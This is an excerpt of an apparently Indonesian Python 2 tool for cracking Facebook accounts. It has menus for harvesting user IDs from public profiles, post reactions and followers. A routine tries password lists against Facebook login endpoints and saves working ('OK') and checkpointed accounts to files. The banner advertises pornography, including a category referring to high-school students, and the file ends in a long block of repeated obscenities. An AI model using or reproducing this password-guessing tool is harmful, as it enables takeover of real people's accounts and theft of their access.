...
def banner():
	print('''
\033[0;36m   _____  ___  __   _ ____   ___
\033[0;36m  |_   _|/   \|  \ | |    \ /   \\  • Bokep Viral
\033[0;36m    | | /  |  \   \| |  |  |  |  \\ • Bokep Hijab
\033[0;33m  __| | |  _  | |\   |  |  |  _  | • Bokep SMA
\033[0;33m |____| |_| |_|_| \__|_____/_| |_| • Bokep Tante

 \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Create By : Moch Aang-XD & Jeeck X Nano
 \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Github    : Github.com/Kang-Toxic''')
...
#    print (' Waktu : %s'%(datetime.now().strftime('%H:%M:%S'))
    ...
    print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m============================================>")
    print(" \033[0;36m[\033[0;35m1\033[0;36m]\033[0;33m Start/Mulai Crack")
    print(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Dump Id Dari Publik \033[0;33m[ \033[0;00m18+ \033[0;33m]")
    print(" \033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Dump Id Dari React Postingan \033[0;33m[ \033[0;00m18+ \033[0;33m]")
    print(" \033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Dump ID Dari Followers \033[0;33m[ \033[0;00m18+ \033[0;33m]")
    print(" \033[0;36m[\033[0;35m5\033[0;36m]\033[0;00m Setting User Agent")
    print(" \033[0;36m[\033[0;35m6\033[0;36m]\033[0;00m Lihat Hasil Crack Saya")
    print(" \033[0;36m[\033[0;35m7\033[0;36m]\033[0;00m Chek Opsi Akun Checkpoin ")
    print(" \033[0;36m[\033[0;35m0\033[0;36m]\033[0;00m Keluar \033[0;33m[ \033[0;00mAH NGECROT \033[0;33m] ")
...
class ngentod:
    ...
    def _jeeck_xnxcode_iy(self):
        ...
        __jeeck__ganz__X__sad__boy__ = raw_input('%s [+] ingin gunakan password manual? [y/t] :%s '%(B,P))
 ...
 #                           
                            print '\n %s[%s+%s] akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt'%(B,U,B,H,P,P,ha, op, ta);jeda(0.2)
                            print '%s [%s+%s] akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt'%(B,U,B,K,P,P,ha, op, ta);jeda(0.2)
                            print '%s [%s!%s] %stunggu & rasakan kemurniannya [ Bear Brand ]\n'%(B,U,B,P);jeda(0.02)
...
#                            
                    ...
                    jeeck("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pilih Metode Untuk Login !!\n")
                    jeeck(" \033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m Metode Api [ Kenceng ]")
                    jeeck(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Metode Mbasic [ Lambat ]")
                    jeeck(" \033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Megode Free Facebook [ 50% Tap Crott ]")
                    jeeck(" \033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Metode Mobile Fb [ Sangat Lambat ]")
                    _jeeck_X_nano_(pwx.split(','))
                    break
        elif __jeeck__ganz__X__sad__boy__ in ('T', 't'):
            jeeck("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pilih Metode Untuk Login !!\n")
            jeeck(" \033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m Metode Api [ Kenceng ]")
            jeeck(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Metode Mbasic [ Lambat ]")
            jeeck(" \033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Megode Free Facebook [ 50% Tap Crott ]")
    ...
    def b_api(self, user, _jeeck_X_nano_):
        ...
        for pw in _jeeck_X_nano_:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                try:
                    ...
                    month = bulan1[month]
                    print '\r %s[Cp] %s | %s | %s %s %s  ' % (O,user,pw,day,month,year)
        ...
        loop += 1
#        
        print('\r \x1b[0;96m[\x1b[0;97m%s\x1b[0;96m][\x1b[0;97m%s/%s\x1b[0;96m][\x1b[0;97mOk:%s\x1b[0;96m][\x1b[0;97mCp:%s\x1b[0;96m]'%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
...
if __name__ == '__main__':
    ...
    folder()
    menu()
#__Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod____Kontol__Anjing__Kentod__Bangsat__Asu__Lonte__Memek__Jancok__Pepek__Ngentod__